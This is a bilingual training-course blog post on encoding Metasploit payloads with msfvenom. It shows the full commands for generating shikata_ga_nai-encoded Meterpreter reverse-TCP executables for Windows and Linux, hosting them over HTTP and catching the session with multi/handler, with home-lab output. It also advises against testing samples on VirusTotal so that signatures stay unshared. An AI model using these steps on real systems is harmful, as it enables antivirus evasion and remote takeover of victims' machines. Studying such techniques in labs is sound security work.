---
layout: post
title: "Encoding Payloads With Msfvenom"
date: "2023-01-15"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Encoding Payloads With Msfvenom
## Encoding Payloads With Msfvenom
Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognizant of AV detection.

Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.

We can evade older signature based AV solutions by encoding our payloads.

Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

# 使用 Msfvenom 编码有效载荷
## 使用 Msfvenom 编码有效负载
鉴于此攻击向量涉及在客户端系统（磁盘）上传输和存储恶意负载，攻击者需要了解 AV 检测。

大多数最终用户 AV 解决方案利用基于签名的检测来识别恶意文件或可执行文件。

我们可以通过对我们的有效载荷进行编码来规避旧的基于签名的 AV 解决方案。

编码是修改有效负载 shellcode 的过程，目的是修改有效负载签名。

## Shellcode
Shellcode (shell-code) is a piece of code typically used as a payload for exploitation.

It gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system.

## Shellcode
Shellcode（shell-code）是一段代码，通常用作漏洞利用的有效载荷。

它的名字来源于术语命令 shell，其中 shellcode 是一段代码，为攻击者提供目标系统上的远程命令 shell。

# Demo: Encoding Payloads With Msfvenom（演示：使用 Msfvenom 编码有效载荷）
When we're targeting a service on a server for example, and we exploit a service, the payload is being executed in memory, and it never actually touches the disk of the target system. Now antivirus solutions like Windows Defender and Malwarebytes or any other third-party antivirus solutions that have been designed for end-user operating systems typically utilize signature-based detection in order to identify malicious files or executables.

[Malwarebytes](https://www.malwarebytes.com/index-var1-8876)

What is signature-based detection? Signature-based detection involves taking a look at the signature of a file. This is very similar to file hashing, whereby each file has a unique hash, and that hash is a unique identifier for each file. In the case of a signature, antivirus companies will typically generate signature for malicious files and payloads and executables as well. And all of these signatures are then stored in the signature database for each of these antivirus companies. 

The entire process is that when you get a client or a target to download a payload and save it on their computer and consequently execute it, the antivirus solution will check the signature of the payload that has just been downloaded, and it will then compare that signature with the signatures that are contained within the antivirus signature database. And if there is a match, then that file is flagged as malicious and is then quarantined or removed from the system.

In order to evade a signature-based detection, we can utilize encoding. However, this particular attack vector is not used anymore primarily because antivirus solutions have a huge signature database, and modifying or changing the signature can only help you to a certain extent. But this technique will probably work on some of the older rudimentary antivirus solutions out there like Windows Defender on Windows 7 or previous versions of Windows, and in some cases, it may work on some new antiviruses. But this is typically not the method that is utilized in regards to client side attacks.

What encoding is? It's the process of modifying the payload shellcode with the objective of modifying the payload signature. So if you modify a file, the signature changes almost immediately. Just modify one byte of a file changes the signature. Encoding can be used to modify the file and move around the various bytes within the file to avoid signature-based detection, but this has its limitations. 

What is shellcode? Shellcode is the payload, or it's the code within the payload. If we're utilizing a meterpreter payload, the meterpreter payload contains code, and that code is called shellcode. Whenever I reference shellcode, I'm referencing the payload itself, but more specifically, I'm talking about the code.

We can utilize encoders to modify the shellcode, consequently changing the signature, which is some cases, can avoid some older antivirus solutions with older signature databases. 

List out the group of encoders that we can utilize.

```
msfvenom --list encoders
```

The only two encoders that have an excellent rank are the `cmd/powershell_base64`, which is very useful for encoding powershell code in base64 and the `x86/shikata_ga_nai` encoder. We can utilize the `x86/shikata_ga_nai` encoder to encode both Linux and Windows payloads.

Let's start off with Windows payload. And we're going to be generating a x86 payload as it will work on both 64-bit and 32-bit operating systems.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
```

If you've paid close attention to the iterations output, we can pretty much encode our payload as many times as we want with `x86/shikata_ga_nai`. Increasing the number of iterations in regards to the encoder that we're utilizing will increase your chances of evading antiviruses. The more you encode it, or the more iterations you go through with encoding your payload with `x86/shikata_ga_nai`, the better chances you have of bypassing an antivirus. 

So we can specify the iterations. 

```
rm encodedx86.exe
```

And we're going to specify the iterations to 10.

`-i 10`: I would typically recommend 10 because anything after 10 will really not improve much or will really not help in regards to evading an antivirus. 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
```

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Linux_Payloads/encodedx86
```

Now that we've taken a look at how to generate the encoded payloads, we can test this out.

```
cd Windows_Payloads/
```

Set up a simple web server to host that particular payload so that I can download it onto the Windows 7 targets.

```
sudo python -m SimpleHTTPServer 80
```

Set up the listener or the handler. We then need to set the payload that we used when we were generating our malicious payload. 

```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
show options
run
```

Switch over to my Windows system.

```
http://10.10.10.5/
```

Once we click on the encoded payload and hit run, that should give us a meterpreter session on our handler.

Switch back to the Kali VM.

```
meterpreter > sysinfo
```

And we now have access to a client side attack.

I wouldn't recommand actually testing these payloads or uploading them to VirusTotal because the signatures will be stored and submitted to antivirus companies. The only way to actually test this is to set up a sandbox system with an antivirus disconnected from the internet. And then test out the payloads to see whether they are detected. And this process will involve a lot of trial and error.

[virustotal](https://www.virustotal.com/gui/home/upload)

# Home Lab
Kali: 192.168.248.148

Windows 7 SP1: 192.168.248.150

```
┌──(root㉿kali)-[~]
└─# msfvenom --list encoders                                                                          

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -e x86/shikata_ga_nai -f exe > encodedx86.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# rm encodedx86.exe
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes
```

```
┌──(root㉿kali)-[~/payloads/Linux_Payloads]
└─# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > encodedx86
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 150 (iteration=0)
x86/shikata_ga_nai succeeded with size 177 (iteration=1)
x86/shikata_ga_nai succeeded with size 204 (iteration=2)
x86/shikata_ga_nai succeeded with size 231 (iteration=3)
x86/shikata_ga_nai succeeded with size 258 (iteration=4)
x86/shikata_ga_nai succeeded with size 285 (iteration=5)
x86/shikata_ga_nai succeeded with size 312 (iteration=6)
x86/shikata_ga_nai succeeded with size 339 (iteration=7)
x86/shikata_ga_nai succeeded with size 366 (iteration=8)
x86/shikata_ga_nai succeeded with size 393 (iteration=9)
x86/shikata_ga_nai chosen with final size 393
Payload size: 393 bytes
Final size of elf file: 477 bytes
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# python2 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

```
┌──(root㉿kali)-[~]
└─# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.248.148
LHOST => 192.168.248.148
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.248.148:1234 
```

```
http://192.168.248.148/
```

```
[*] Sending stage (175686 bytes) to 192.168.248.150
[*] Meterpreter session 1 opened (192.168.248.148:1234 -> 192.168.248.150:49268) at 2023-01-15 09:05:40 -0500

meterpreter > sysinfo
Computer        : IEWIN7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
